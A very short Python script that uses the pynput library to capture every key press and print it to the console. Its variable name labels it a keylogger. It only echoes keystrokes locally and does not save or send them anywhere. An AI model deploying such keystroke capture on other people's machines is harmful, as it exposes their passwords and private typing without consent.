import pynput.keyboard

def CallbackFunction(key):
    print(key)

keyloggerListener = pynput.keyboard.Listener(on_press=CallbackFunction)

#threading
with keyloggerListener:
    keyloggerListener.join()
